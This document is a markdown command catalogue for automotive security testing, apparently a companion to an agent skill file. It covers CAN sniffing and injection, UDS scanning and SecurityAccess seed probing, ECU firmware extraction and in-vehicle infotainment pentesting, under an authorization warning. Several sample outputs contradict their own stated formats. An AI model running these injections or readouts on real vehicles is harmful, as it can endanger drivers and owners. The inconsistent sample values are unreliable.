# Automotive & Vehicle Security Payloads / Command & Exploit Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after the per-tool install steps in §1.
>
> Placeholder convention: `<vehicle-ip>` is the telematics unit IP, `<ecu-addr>` is a physical diagnostic address (0x7E0-0x7E7), `<can-iface>` defaults to `can0` (SocketCAN), `<dbc-file>` is a `.dbc` file, `<channel>` is the vcan/pcan interface name, `<broker>` is the OEM cloud MQTT broker. Replace before running.
>
> **CRITICAL SAFETY NOTE**: Never transmit on a vehicle CAN bus without explicit written authorization from the owner AND the manufacturer. Safety-critical injections (brake, steer, powertrain, airbag) require a closed course with a safety driver. Some commands in this file (key fob capture, GNSS spoof, CAN injection) are illegal in most jurisdictions without explicit authorization.

---

## 1. CAN Setup — Linux SocketCAN + can-utils Installation

```bash
# ─── can-utils (Linux Foundation reference SocketCAN userland) ───
sudo apt-get install -y can-utils
candump --version
# Provides: candump, cansend, cansniffer, cangen, canplayer, isotpsend, isotprecv, isotpperf, slcand, log2asc

# ─── SocketCAN kernel support (built into Kali 2025-2 by default) ───
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan       # virtual CAN for lab use (no hardware)
sudo modprobe slcan      # serial-line CAN (for USBTin, Lawicel CANUSB)
sudo modprobe can-dev    # CAN device support (for Kvaser/PCAN kernel drivers)

# ─── Verify modules loaded ───
lsmod | grep -E '^can|^slcan|^vcan'
#   can_raw               36864  0
#   can                   28672  1 can_raw
#   slcan                 20480  0
#   vcan                  16384  0

# ─── python-can (Python CAN library, multi-backend) ───
pip3 install python-can
python3 -c "import can; print(can.__version__)"

# ─── cantools (DBC file encode/decode) ───
pip3 install cantools
cantools --version

# ─── Scapy with automotive layers (UDS, ISO-TP, GMLAN, SOME-IP, XCP) ───
pip3 install scapy
python3 -c "from scapy.contrib.automotive.uds import *; print('UDS layer OK')"

# ─── Savvy-CAN (Qt GUI, optional) ───
# Download from https://github.com/collin80/SavvyCAN/releases
# Requires Qt5; on Kali: sudo apt-get install -y qtbase5-dev
chmod +x SavvyCAN && ./SavvyCAN
```

## 2. Hardware Setup — CANBadger/Macchina/USBTin/Kaya vs OBD-II Adapters

```bash
# ─── Tier 1: USBTin (~$50, canutils-compatible) ───
# USB-to-CAN bridge using Microchip MCP2515. Slcan protocol over USB-CDC.
sudo slcand -o /dev/ttyACM0 -s 500000 -S 500000 can0
sudo ip link set up can0
# -o = open; -s = speed (slcan baudrate code; 500000 = 6); -S = serial baudrate
ip -details link show can0
#   can0: <NOARP,UP,LOWER_UP> mtu 16 qdisc ...

# ─── Tier 2: Kvaser / PCAN-USB / Vector VN1630 ($500-$5000) ───
# Kernel drivers built into Kali for Kvaser (kvaser_usb) and PCAN (peak_pci):
sudo modprobe kvaser_usb
sudo modprobe peak_usb
dmesg | tail -5
#   kvaser_usb 1-2:1.0: Kvaser USBcan II HS/LS
#   can: registering protocol family 29
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# ─── Tier 3: Macchina M2 (Arduino-based, $100) ───
# Open-source automotive dev board. Program via Arduino IDE with CAN library.
# Provides 2x CAN (MCP25625), LIN, USB serial for SocketCAN.
# After flashing m2_can_bridge.ino, appears as slcan-compatible /dev/ttyACM0
sudo slcand -o /dev/ttyACM0 -s 500000 -S 115200 can0

# ─── Tier 4: CANBadger (~$400, purpose-built attack tool) ───
# ESP32 + 2x CAN (MCP25625) + Ethernet + Wi-Fi. Web UI for fuzz/injection.
# Bring up the Web UI by powering on and connecting to its AP / Ethernet
# Default IP: 192.168.4.1, web UI on http://192.168.4.1
# Provides scriptable Lua interface for autonomous attack campaigns

# ─── Tier 5: ELM327 OBD-II adapter (cheap, ~$15, blue-tooth/wifi) ───
# CAUTION: ELM327 supports OBD-II PIDs but NOT raw CAN. Limited to mode 01-0A reads.
# Useful for quick PID enumeration but NOT for DBC reversing or CAN injection.
# Bluetooth pairing:
sudo rfcomm bind 0 00:1D:A5:00:0F:00 1   # bind ELM327 BT MAC to /dev/rfcomm0
screen /dev/rfcomm0 38400
# ATSP6  →  set protocol to ISO 15765-4 CAN 11-bit 500kbps
# 010C   →  request engine RPM

# ─── OBD-II pinout (J1962 connector, female side on vehicle) ───
# Pin  2: J1850 PWM+ (legacy Ford)
# Pin  3: MS-CAN-H (Ford medium-speed)
# Pin  4: Chassis GND
# Pin  5: Signal GND
# Pin  6: CAN-H (ISO 15765-4, mandatory since 2008 in US)
# Pin  7: K-Line (ISO 9141-2 / KWP2000)
# Pin  8: Misc (manufacturer)
# Pin 10: J1850 PWM- (legacy Ford)
# Pin 11: MS-CAN-L (Ford medium-speed)
# Pin 14: CAN-L (ISO 15765-4)
# Pin 15: L-Line (ISO 9141-2 / KWP2000)
# Pin 16: Battery 12V (always-on)

# ─── Bitrate cheat sheet (passenger vehicles, common) ───
#   500 kbps   Most modern cars (VW MQB, Hyundai-Kia, Toyota TNGA, BMW)
#   250 kbps   Heavy-duty (J1939), some Mazda, some Nissan
#   33.3 kbps  GMLAN low-speed (body) on older GM
#   95.2 kbps  Single-wire CAN (GMLAN SWC, older GM)
#   100 kbps   LIN (single-wire, body) — NOT CAN
#   83.3 kbps  Older ISO 9141 K-Line
#   500/2000   CAN-FD (arbitration 500k, data phase 2 Mbps)
```

## 3. CAN Bus Sniffing — candump/cansniffer, Capturing Traffic

```bash
# ─── Bring up the interface (use vcan0 if no hardware) ───
sudo ip link add dev vcan0 type vcan && sudo ip link set up vcan0
# OR for real hardware: sudo ip link set can0 type can bitrate 500000 && sudo ip link set up can0

# ─── Passive capture: candump with timestamps (-L), ASC format for Vector compatibility ───
candump -L can0 > trace.asc
# Sample line: (1609487127.521379) can0 123#DEADBEEFCAFEBABE
#   ^timestamp              ^iface ^ID  ^data (8 bytes hex)

# ─── Compact capture (no timestamp, for piping) ───
candump -tA can0 > trace_compact.asc
#   (1609487127.521379)  can0  123   [8]  DE AD BE EF CA FE BA BE

# ─── Live delta view: cansniffer shows which arbitration IDs are changing ───
cansniffer -c can0
# Each CAN ID is a column. Bits that changed since the last frame flash bright.
# Press 'q' to quit. Press '#' to toggle hex/binary display.
# Use this to identify which ID carries the signal you're manipulating physically.

# ─── Filter to specific IDs (whitelist during targeted capture) ───
candump -L can0,7E0:7FF,7DF:7FF > uds.asc
# Only capture arbitration IDs 0x7E0-0x7FF (physical diagnostic) and 0x7DF (functional broadcast)

# ─── Filter to exclude specific IDs (blacklist) ───
candump -L can0,7DF:7FF~ > no_func.asc
# Capture everything EXCEPT 0x7DF (functional broadcast)

# ─── Capture to pcap for Wireshark analysis ───
candump -L can0 | python3 -c "
import sys
from scapy.all import *
pkts = []
for line in sys.stdin:
    # parse '(ts) can0 ID#DATA'
    parts = line.strip().split()
    ts = float(parts[0].strip('()'))
    id_data = parts[2].split('#')
    arb_id = int(id_data[0], 16)
    data = bytes.fromhex(id_data[1])
    # Craft a CAN frame (requires CAN-related contrib)
    pkt = Ether()/Raw(load=bytes([arb_id & 0xFF]) + data)
    pkt.time = ts
    pkts.append(pkt)
wrpcap('trace.pcap', pkts)
"

# ─── Replay a captured trace (for testing / lab only) ───
canplayer -I trace.asc
# Replays frames at their original timestamps. CAUTION: this transmits on the bus!

# ─── Generate random traffic for IDS testing (cangen) ───
cangen can0 -g 10 -n 1000 -I 0x123 -D 11223344DEADBEEF
# -g 10ms gap; -n 1000 frames; -I 0x123 arbitration ID; -D fixed data
cangen can0 -g 5 -e    # extended (29-bit) IDs, random data, 5ms gap (flood for IDS testing)

# ─── Send a single test frame ───
cansend can0 123#DEADBEEFCAFEBABE
#   arbitration ID 0x123, 8 data bytes

cansend can0 1FFFFFFF#0102030405060708   # extended 29-bit ID
```

## 4. DBC File Reversing — cantools decode

```bash
# ─── Clone OpenDBC (Comma.ai's open DBC collection) ───
git clone https://github.com/commaai/opendbc
ls opendbc/dbc/
#   acura/  bmw/  ford/  gm/  honda/  hyundai/  kia/  nissan/  subaru/  tesla/  toyota/  vw/  ...

# ─── Dump a DBC (show its structure) ───
cantools dump opendbc/dbc/hyundai/hyundai_generic.dbc | head -40
# Shows: BU_ (nodes), BO_ (messages with arbitration IDs), SG_ (signals with bit layout)
# Sample:
#   BO_ 885 SCM_115: 8 XXX
#    SG_ CF_CluSpeed : 0|16@1+ (0.01,0) [0|327.67] "kmh" XXX
#    SG_ CF_CluSteering : 16|16@1+ (1,0) [0|65535] "deg" XXX

# ─── Decode a single raw frame ───
cantools decode opendbc/dbc/hyundai/hyundai_generic.dbc 375#0080C400000000
#   {'CF_CluSpeed': {'CF_CluSpeed': 32.0}, 'CF_CluSteering': ...}
# Decode multiple frames piped from candump:
candump -L can0 | cantools decode opendbc/dbc/hyundai/hyundai_generic.dbc --prune

# ─── Encode a frame (for injection or testing) ───
cantools encode opendbc/dbc/hyundai/hyundai_generic.dbc CF_CluSpeed=100.0 CF_CluSteering=200
#   375#00C8E80300000000

# ─── List signals in a DBC ───
cantools list opendbc/dbc/hyundai/hyundai_generic.dbc

# ─── Side-channel correlation: identify unknown signals ───
# Step 1: Capture baseline (vehicle stationary, key on, brake off, steering at 0°)
candump -L can0 > baseline.asc

# Step 2: Change ONE state (e.g., depress brake pedal) and capture again
candump -L can0 > braked.asc

# Step 3: Diff to find which arbitration IDs and bits changed
# Use cantools' built-in diff or a custom Python script:
python3 <<'EOF'
import cantools, sys
db = cantools.database.load_file('opendbc/dbc/hyundai/hyundai_generic.dbc')

def parse(path):
    frames = {}
    with open(path) as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) < 3 or '#' not in parts[2]:
                continue
            arb_id = int(parts[2].split('#')[0], 16)
            data = bytes.fromhex(parts[2].split('#')[1])
            frames.setdefault(arb_id, []).append(data)
    return frames

base = parse('baseline.asc')
test = parse('braked.asc')

# Find IDs present in both, where data changed
for arb_id in sorted(set(base) & set(test)):
    if base[arb_id][-1] != test[arb_id][-1]:
        print(f"0x{arb_id:03X} changed:")
        print(f"  baseline: {base[arb_id][-1].hex()}")
        print(f"  braked:   {test[arb_id][-1].hex()}")
        # XOR to find changed bits
        xor = bytes(a ^ b for a, b in zip(base[arb_id][-1], test[arb_id][-1]))
        print(f"  xor:      {xor.hex()}")
EOF

# ─── Convert candump ASC to Vector ASC (for Vector CANoe/CANalyzer compat) ───
python3 -c "
import cantools
db = cantools.database.load_file('dbc.dbc')
# Use cantools.database.can.formats
from cantools.database.can.formats import dbc
print('DBC OK')
"
```

## 5. CAN-FD Considerations — MTU Changes, New Tools

```bash
# ─── CAN-FD basics ───
# ISO 11898-1:2015. Key changes from classic CAN:
#   - Payload up to 64 bytes (vs 8)
#   - Dual bit-rate: arbitration 500 kbps, data phase 2-5 Mbps
#   - BRS (Bit Rate Switch) flag
#   - ESI (Error State Indicator) flag
#   - FDF (FD Format) flag = 1

# ─── Bring up a CAN-FD interface ───
sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
sudo ip link set can0 mtu 72        # CAN-FD max frame = 72 bytes
sudo ip link set up can0
ip link show can0
#   can0: <NOARP,UP,LOWER_UP> mtu 72 qdisc ...

# ─── CAN-FD-compatible candump ───
candump -L can0 fd trace-fd.asc
# Note the 'fd' flag — older can-utils may not support FD; ensure you have can-utils >= 2020.05

# ─── Send a CAN-FD frame (64 bytes max payload) ───
cansend can0 123##1000112233445566778899AABBCCDDEE...FF   # ##1 means FD frame with BRS
# Format: <id>##<flags><data>
#   flags: 0 = no BRS, no ESI; 1 = BRS; 2 = ESI; 3 = BRS+ESI

# ─── python-can CAN-FD send ───
python3 <<'EOF'
import can
bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000,
                         data_bitrate=2000000, fd=True)
msg = can.Message(arbitration_id=0x123,
                  data=bytes(range(64)),
                  is_fd=True, bitrate_switch=True)
bus.send(msg)
print(f"Sent FD frame: ID=0x{msg.arbitration_id:03X} len={len(msg.data)}")
EOF

# ─── cantools with CAN-FD-aware DBC ───
# DBC must have FD-aware signal definitions (BA_ "VFrameFormat" set to "ExtendedFD")
cantools dump --fd opendbc/dbc/fd-sample.dbc

# ─── Adapter compatibility check ───
# Confirmed CAN-FD-capable:
#   PCAN-USB FD (Peak), Kvaser Hybrid, Vector VN1630/VN1640, Lawicel CANUSB-FD,
#   ESP32 (TWAI FD mode), Macchina M2 (with MCP2517FD), CANBadger v2
# CAN-FD-INCOMPATIBLE (do NOT use):
#   ELM327 (any version), Lawicel CANUSB (classic), MCP2515-based (Macchina M2 v1, USBTin)
```

## 6. UDS (ISO 14229-1) Enumeration — scapy UDS scanner, services 0x10-0x3E

```python
#!/usr/bin/env python3
# udscan.py — UDS service enumeration and SecurityAccess probe
# Based on scapy's scapy.contrib.automotive.uds layer

import can
from scapy.contrib.automotive.uds import *
from scapy.all import *

# 1. Configure the SocketCAN bus
bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)

# 2. UDS addresses:
#    Functional broadcast: 0x7DF (all ECUs respond on 0x7E8-0x7EF)
#    Physical: 0x7E0-0x7E7 (engine: 0x7E0, transmission: 0x7E1, ABS: 0x7E3, etc.)
#    Response from ECU N: 0x7E8 + (N - 0)

def uds_request(target_id, service_id, sub_function=0x00, data=b'', timeout=1.0):
    """Send a UDS single-frame request over ISO-TP."""
    payload = bytes([service_id, sub_function]) + data
    iso_tp_data = bytes([len(payload) & 0x0F]) + payload
    iso_tp_data += b'\x00' * (8 - len(iso_tp_data))
    msg = can.Message(arbitration_id=target_id, data=iso_tp_data, is_extended_id=False)
    bus.send(msg)
    return bus.recv(timeout=timeout)

TARGET = 0x7E0

# 3. Enumerate UDS services 0x10-0x3E
print(f"\n=== UDS service scan on 0x{TARGET:03X} ===")
for svc in range(0x10, 0x3F):
    if svc == 0x3E:
        continue  # TesterPresent — skip (would keep ECU alive)
    resp = uds_request(TARGET, svc)
    if resp is None:
        continue
    if resp.data[0] == (svc + 0x40):
        print(f"  0x{svc:02X} supported (positive: {resp.data.hex()})")
    elif resp.data[0] == 0x7F and resp.data[1] == svc:
        nrc = resp.data[2]
        nrc_names = {
            0x11: 'serviceNotSupported',
            0x12: 'subFunctionNotSupported',
            0x13: 'incorrectMessageLength',
            0x22: 'conditionsNotCorrect',
            0x24: 'requestSequenceError',
            0x31: 'requestOutOfRange',
            0x33: 'securityAccessDenied',
            0x35: 'invalidKey',
            0x36: 'exceedNumberOfAttempts',
            0x37: 'requiredTimeDelayNotExpired',
            0x72: 'generalProgrammingFailure',
            0x78: 'requestCorrectlyReceivedResponsePending',
        }
        name = nrc_names.get(nrc, f'unknown_0x{nrc:02X}')
        print(f"  0x{svc:02X} rejected — NRC 0x{nrc:02X} ({name})")

# 4. Open extended diagnostic session
print(f"\n=== Open extended session ===")
resp = uds_request(TARGET, 0x10, 0x03)  # 0x10 DiagnosticSessionControl, sub 0x03 extended
if resp and resp.data[0] == 0x50:
    print(f"  Session opened: P2={resp.data[1]*resp.data[2]}ms, P2*={resp.data[3]*resp.data[4]}ms")

# 5. Probe SecurityAccess (request seed on sub 0x01)
print(f"\n=== SecurityAccess seed request ===")
resp = uds_request(TARGET, 0x27, 0x01)
if resp is None:
    print("  No response")
elif resp.data[0] == 0x67:
    seed = resp.data[2:]
    print(f"  Seed received ({len(seed)} bytes): {seed.hex()}")
    if len(seed) <= 2:
        print("  WARNING: Seed length <= 2 bytes — brute-forceable in minutes!")
elif resp.data[0] == 0x7F and resp.data[2] == 0x11:
    print("  Service 0x27 not supported in this session")
elif resp.data[0] == 0x7F and resp.data[2] == 0x33:
    print("  SecurityAccess denied — may need higher session")

# 6. Read ECU identification (DID 0xF190 = VIN, 0xF180 = Boot SW, 0xF187 = Manufacturer)
print(f"\n=== Read ECU identification ===")
for did, name in [(0xF190, 'VIN'), (0xF180, 'BootSW'), (0xF187, 'Mfr'),
                  (0xF1A0, 'ECU Serial')]:
    did_hi, did_lo = (did >> 8) & 0xFF, did & 0xFF
    resp = uds_request(TARGET, 0x22, did_hi, bytes([did_lo]))
    if resp and resp.data[0] == 0x62:
        value = resp.data[3:].decode('ascii', errors='replace').rstrip('\x00')
        print(f"  DID 0x{did:04X} ({name}): {value!r}")

# 7. Scan 0x27 seed length across all ECUs (0x7E0-0x7E7)
print(f"\n=== Seed-length scan across ECUs ===")
for addr in range(0x7E0, 0x7E8):
    resp = uds_request(addr, 0x27, 0x01, timeout=0.5)
    if resp and resp.data[0] == 0x67:
        seed = resp.data[2:]
        print(f"  0x{addr:03X}: seed={seed.hex()} ({len(seed)} bytes)")
```

```bash
# ─── UDS enumeration via raw cansend (one-shot, no scapy) ───
# Send: UDS 0x10 DiagnosticSessionControl subfunc 0x03 (extended session)
# ISO-TP single frame: 02 10 03 00 00 00 00 00
cansend can0 7E0#0210030000000000
candump -L can0 -n 1
# Response on 0x7E8: 06 50 03 00 32 01 F4 00
#                     ^^ ^^ ^^    ^^^^^^^^^ P2/P2* timing
#                     06 = single frame, 6 data bytes; 50 = 0x10+0x40 positive

# ─── TesterPresent keep-alive (must be sent every ~5s in extended session) ───
cansend can0 7E0#023E000000000000   # UDS 0x3E TesterPresent subfunc 0x00 (no response)

# ─── Read VIN via DID 0xF190 (UDS 0x22 ReadDataByIdentifier) ───
# UDS 0x22 subfunc DID_hi DID_lo → ISO-TP: 03 22 F1 90 00 00 00 00
cansend can0 7E0#0322F19000000000
candump -L can0 -n 1
# Response (multi-frame for VIN, 17 chars):
#   First frame: 10 14 62 F1 90 ...   (10=first frame, 14=length 20)
#   Consecutive: 21 56 49 4E 30 31 32 3  (21=consecutive, seq 1)
#   VIN ASCII: '1HGCM82633A123456' etc.

# ─── Negative response codes (NRCs) cheat sheet ───
#   0x10  generalReject
#   0x11  serviceNotSupported
#   0x12  subFunctionNotSupported
#   0x13  incorrectMessageLengthOrInvalidFormat
#   0x14  responseTooLong
#   0x21  repeatRequest
#   0x22  conditionsNotCorrect
#   0x24  requestSequenceError
#   0x25  noResponseFromSubnetComponent
#   0x31  requestOutOfRange
#   0x33  securityAccessDenied
#   0x35  invalidKey
#   0x36  exceedNumberOfAttempts
#   0x37  requiredTimeDelayNotExpired
#   0x70  uploadDownloadNotAccepted
#   0x71  transferDataSuspended
#   0x72  generalProgrammingFailure
#   0x73  wrongBlockSequenceCounter
#   0x78  requestCorrectlyReceivedResponsePending
#   0x7E  subFunctionNotSupportedInActiveSession
#   0x7F  serviceNotSupportedInActiveSession
```

## 7. KWP2000 (ISO 14230) — Legacy Diagnostic Protocol

```bash
# ─── KWP2000 over K-Line (ISO 9141-2 / ISO 14230-3) ───
# Pre-2008 vehicles, especially European and Asian. Single-wire, half-duplex.
# Address formats vary: 5-baud init (33 kbps), fast-init (10.4 kbps).

# ─── Setup K-Line serial ───
# USB-KKL adapter (TTL-232R-5V or similar with K-Line transceiver)
sudo stty -F /dev/ttyUSB0 10400 cs8 -cstopb -parenb -crtscts raw -echo

# ─── 5-baud init sequence (wake the ECU) ───
python3 <<'EOF'
import serial, time
ser = serial.Serial('/dev/ttyUSB0', 10400, bytesize=8, parity='N', stopbits=1)
# 5-baud init: send target address at 5 baud (each bit = 200 ms)
# Address byte 0x33 (common for engine ECU)
addr = 0x33
# Break the line first (250 ms low)
ser.break_condition = True
time.sleep(0.250)
ser.break_condition = False
# Send the address byte at 5 baud (start bit + 8 data bits + stop bit = 10 bits * 200 ms = 2 s)
# This is tricky to time on a USB-serial; specialized K-Line adapters handle it.
time.sleep(0.050)
ser.write(bytes([addr]))
ser.flush()
time.sleep(0.300)
# Read the ECU's key bytes (0x55, 0x08, 0x08)
data = ser.read(3)
print(f"Init response: {data.hex()}")  # 55 08 08 indicates ISO 14230 readiness
EOF

# ─── KWP2000 services (similar to UDS but legacy encoding) ───
# 0x10  StartDiagnosticSession     (UDS DiagnosticSessionControl analog)
# 0x14  ClearDiagnosticInformation
# 0x18  ReadDiagnosticTroubleCodes
# 0x1A  ReadEcuIdentification
# 0x22  ReadDataByLocalIdentifier
# 0x27  SecurityAccess            (same as UDS)
# 0x2E  WriteDataByLocalIdentifier
# 0x31  StartRoutineByLocalIdentifier
# 0x34  RequestDownload
# 0x36  TransferData
# 0x37  RequestTransferExit
# 0x3E  TesterPresent

# ─── KWP-on-CAN (ISO 15765-3 / DoCAN replaces KWP2000 in CAN vehicles) ───
# Modern vehicles use UDS (ISO 14229) over CAN; KWP2000 only on legacy K-Line.

# ─── Tools: ───
#   ISO-TP stack: pyvit (Python Vehicle Information Toolkit)
#   SAE J2534 passthru (commercial): Tactrix OpenPort 2.0, ScanTool OBDLink
#   Free tools: python-OBD, pyvit, freediag
pip3 install python-OBD
python3 -c "import obd; print(obd.__version__)"
```

## 8. OBD-II Standard PIDs — mode 0x01-0x0A

```bash
# ─── OBD-II modes (ISO 15031-5 / SAE J1979) ───
#   0x01  Current data           (real-time PIDs)
#   0x02  Freeze frame data
#   0x03  Read stored DTCs
#   0x04  Clear DTCs
#   0x05  Test results, O2 sensor (non-CAN)
#   0x06  Test results, other systems
#   0x07  Show pending DTCs
#   0x08  Control of operation
#   0x09  Vehicle information    (VIN, calibration)
#   0x0A  Permanent DTCs

# ─── Mode 0x01 PID enumeration (response on 0x7E8) ───

# PID 0x00: Supported PIDs 0x01-0x20 (4-byte bitmask)
cansend can0 7DF#0201000000000000
# Response: 0x7E8#064100BE3EB811 (4 bytes = bitmask of supported PIDs)

# PID 0x0C: Engine RPM (2 bytes, /4)
cansend can0 7DF#02010C0000000000
# Response: 7E8#04410C1F88000000 → RPM = (0x1F88 / 4) = 2024.5

# PID 0x0D: Vehicle speed (1 byte, km/h)
cansend can0 7DF#02010D0000000000
# Response: 7E8#03410D3200000000 → 50 km/h

# PID 0x05: Coolant temp (1 byte, °C offset -40)
cansend can0 7DF#0201050000000000
# Response: 7E8#0341055C00000000 → 0x5C = 92°C (raw 92 = 92°C actual)

# PID 0x0F: Intake air temp
cansend can0 7DF#02010F0000000000

# PID 0x11: Throttle position (1 byte, /2.55 for %)
cansend can0 7DF#0201110000000000
# Response: 7E8#0341116400000000 → 0x64 = 100 → 100/2.55 = 39.2%

# PID 0x2F: Fuel level (1 byte, /2.55 for %)
cansend can0 7DF#02012F0000000000

# PID 0x46: Ambient air temp
cansend can0 7DF#0201460000000000

# PID 0x5C: Engine oil temp
cansend can0 7DF#02015C0000000000

# ─── Mode 0x03: Read stored DTCs ───
cansend can0 7DF#0203000000000000
# Response: first byte of payload after 0x43 = number of DTCs
#   Then 2 bytes per DTC: first 2 bits = system, next 10 bits = code number
#   E.g., 0x0179 → DTC P0179 (system P = powertrain, code 0179)

# ─── Mode 0x09 PID 0x02: VIN (multi-frame ISO-TP) ───
cansend can0 7DF#0209020000000000
# Response sequence:
#   7E8#10 14 49 02 01 31 47 31  (first frame, 0x14=20 bytes, frame 1)
#   7E8#21 4E 36 32 30 35 35 30  (consecutive, frame 2, "1G1N620550...")
#   7E8#22 31 32 33 34 35 36 00  (consecutive, frame 3, "...123456")
# Reassembled VIN: "1G1N620550123456" (17 chars)

# ─── python-OBD for quick enumeration ───
python3 <<'EOF'
import obd
# connection over ELM327 (usb-serial) or SocketCAN bridge
connection = obd.OBD("/dev/ttyUSB0")  # or obd.OBD("can0")
if connection.status() == obd.OBDStatus.Car_Connected:
    for cmd_name in ['RPM', 'SPEED', 'COOLANT_TEMP', 'THROTTLE_POS',
                     'FUEL_LEVEL', 'OIL_TEMP', 'AMBIANT_AIR_TEMP']:
        cmd = getattr(obd.commands, cmd_name)
        response = connection.query(cmd)
        print(f"{cmd_name}: {response.value}")
connection.close()
EOF
```

## 9. ECU Firmware Extraction — Boot Mode, JTAG, NAND Readout

```bash
# ─── Boot-mode firmware extraction (MPC5xxx / RH850 / ARM Cortex-R) ───
# Goal: bypass secure boot, get plaintext firmware from flash.

# Method A: Boot-mode pin strap (MPC56xx, MPC57xx)
# Power-on with the BOOT0/BOOTS pin strapped low → ECU enters serial boot mode
# Reads from internal flash via a serial debug interface (JTAG, NEXUS, or Aurora)
# Tools: P&E Micro Universal Multilink, Lauterbach Trace32, iSYSTEM iC5500
# (Commercial; ~$5k-$50k. Open-source: OpenBLT bootloader for some platforms)

# Method B: NAND desoldering (destructive, voids warranty)
# 1. Desolder the eMMC or NAND flash chip (TSOP-48, BGA-132)
# 2. Read with a flash programmer (Xeltek SuperPro, RT809F, CH341A-based)
# Example with CH341A (~$15) on a TSOP-48 NAND:
sudo flashrom -p ch341a_spi -r ecu_nand.bin
# For eMMC: use an eMMC socket reader (~$30)
sudo dd if=/dev/sdb of=ecu_emmc.bin bs=4M

# Method C: UDS firmware readout (if 0x27 SecurityAccess is broken)
# 1. Open programming session: cansend can0 7E0#0210020000000000
# 2. Brute 0x27 seed/key (see §6)
# 3. UDS 0x34 RequestDownload (set address/length for download)
cansend can0 7E0#0734040000000000
#    07 = single frame, 7 data; 34 = service; 04 = dataFormatIdentifier=0,
#    addressAndLengthFormatIdentifier=4 (4-byte addr, 4-byte length)
# 4. UDS 0x36 TransferData (read blocks)
# 5. UDS 0x37 RequestTransferExit

# ─── Firmware analysis with binwalk (extract embedded files) ───
binwalk -e ecu_firmware.bin
# Extracted: LZMA-compressed kernel, root filesystem, calibration tables

# ─── A2L / INCA calibration file (ECU calibration data, not code) ───
# These map ECU memory addresses to calibration parameters (air/fuel maps,
# torque limits, etc.). Often obtained from dealer/ECU tuner leaks.
# WinOLS / ECM Titanium / BitEdit are commercial tools for editing calibrations.

# ─── Reverse with Ghidra (target MPC5xxx, RH850, ARM Cortex-R) ───
# Ghidra supports PowerPC (MPC5xxx), V850/RH850 (via processor extension),
# ARM Cortex-R (standard ARM LE).
# Open firmware.bin in Ghidra → select processor → auto-analyze.
# Look for: UDS service dispatcher (jump table at fixed address),
#   seed/key algorithm (search for byte sequences matching known algorithms).

# ─── Open-source seed/key databases ───
# https://github.com/rmundez/SeedNKey  — community seed/key implementations
# Common patterns: linear LFSR, simple XOR with fixed key, GM "GM_H" variant
```

## 10. IVI Pentest — Android Automotive, QNX, Automotive Linux

```bash
# ─── Android Automotive OS (AAOS) IVI pentest ───
# AAOS is a full Android stack on the IVI head unit. Attack surface mirrors
# mobile-security with the added CAN bus pivot.

# Step 1: Enable ADB (if not in production)
adb devices    # should list the IVI
# Some OEMs disable ADB in production; check Settings → Developer options

# Step 2: Enumerate installed packages
adb shell pm list packages -f > packages.txt
adb shell pm list packages -3   # third-party only

# Step 3: Decompile OEM IVI apps with jadx
adb shell pm path com.toyota.ivi.system
# package:/data/app/com.toyota.ivi.system-XXXX/base.apk
adb pull /data/app/com.toyota.ivi.system-XXXX/base.apk
jadx -d out/ base.apk
# Extract hardcoded API endpoints, broker URLs, OTA URLs

# Step 4: Network traffic (with mitmproxy)
mitmproxy --mode transparent -p 8080
# Configure the IVI to route through your AP / VPN
# Look for: OTA update URLs, cloud MQTT brokers, OEM API endpoints

# Step 5: Frida for runtime hooks
# Install frida-server on IVI (requires root or debuggable APK)
adb push frida-server-arm64 /data/local/tmp/frida-server
adb shell "chmod +x /data/local/tmp/frida-server && su -c '/data/local/tmp/frida-server &'"
frida-ps -U                  # list running processes
frida -U -f com.toyota.ivi.system -l hook_ota.js --no-pause

# Step 6: Check the CAN bus pivot
# The IVI communicates with the vehicle bus via a gateway ECU
# Find the gateway app: adb shell pm list packages | grep gateway
# Test: send a CAN frame from the IVI side, does it reach the powertrain bus?

# ─── QNX (BlackBerry QNX) IVI pentest ───
# QNX is a POSIX-compliant RTOS used by Audi (MMI), BMW (iDrive), Hyundai.
# Less Android-like; attack surface: serial console, QNX resource managers,
# photon (UI framework), pps (persistent publish-subscribe for state).

# Connect via serial (115200 8N1)
sudo screen /dev/ttyUSB0 115200
# QNX prompt typically: # (root shell by default in dev mode)

# List QNX resource managers (each is a "device" in /dev)
ls /dev/                     # /dev/can0, /dev/ser1, /dev/pps
ls /pps/                     # QNX PPS publish/subscribe state

# Read PPS objects (state of vehicle systems)
cat /pps/services/can/status
cat /pps/services/audio/status

# ─── Automotive Linux (AGL — Automotive Grade Linux) ───
# AGL is a Yocto-based distribution; runs on the IVI as a Linux system
# Standard Linux pentest applies: ssh, sudo, /etc/passwd, /etc/shadow

ssh root@ivi.local
ps aux                       # find the CAN daemon
# agl-service-can-low-level  — AGL's CAN binding
# Test the API: curl http://localhost:3003/api/can/signals

# ─── OTA update mechanism check ───
# Most OEM IVIs download updates via HTTPS to a signed bundle
# Verify signature:
adb pull /data/ota/update.zip
unzip -l update.zip          # look for META-INF/MANIFEST.MF, signature files
# OpenSSL to verify the signature:
openssl pkcs7 -inform DER -in update.zip.sig -print_certs
# Common finding: unsigned bundle, weak signature algorithm, downgrade allowed

# ─── Bluetooth attack surface ───
# IVI's Bluetooth is often always-on and discoverable for pairing
bluetoothctl scan on         # find the IVI's BD_ADDR
# Probe SDP records: handsfree, audio sink, PBAP (phonebook), A2DP
sdptool browse <IVI-MAC>
# Test BlueBorne (CVE-2017-1000251) and similar BT stack RCEs

# ─── USB attack surface ───
# Many IVIs auto-mount USB with autorun-style features (CVE-prone)
# Plug in a USB device; check what gets executed:
adb logcat | grep -i usb
# Some IVIs execute scripts from USB for diagnostics — major RCE vector
```

## 11. CANToolz Framework — Black-Box Analysis

```bash
# ─── CANToolz (eik00d, Black Hat EU 2016) ───
git clone https://github.com/CANToolz/CANToolz
cd CANToolz
pip3 install -r requirements.txt

# ─── Start CANToolz with a SocketCAN interface ───
python3 cantoolz.py -c can0 -b 500000
# Opens interactive shell with modules:
#   capture   — record frames to memory/disk
#   mine      — period/frequency analysis
#   send      — inject frames
#   fuzz      — random/structured fuzzing
#   protect   — whitelist IDS
#   parse     — DBC integration
#   bridge    — man-in-the-middle between two CAN interfaces

# ─── Sample workflow: capture + mine + replay ───
# In the CANToolz REPL:
capture 60           # capture 60 seconds
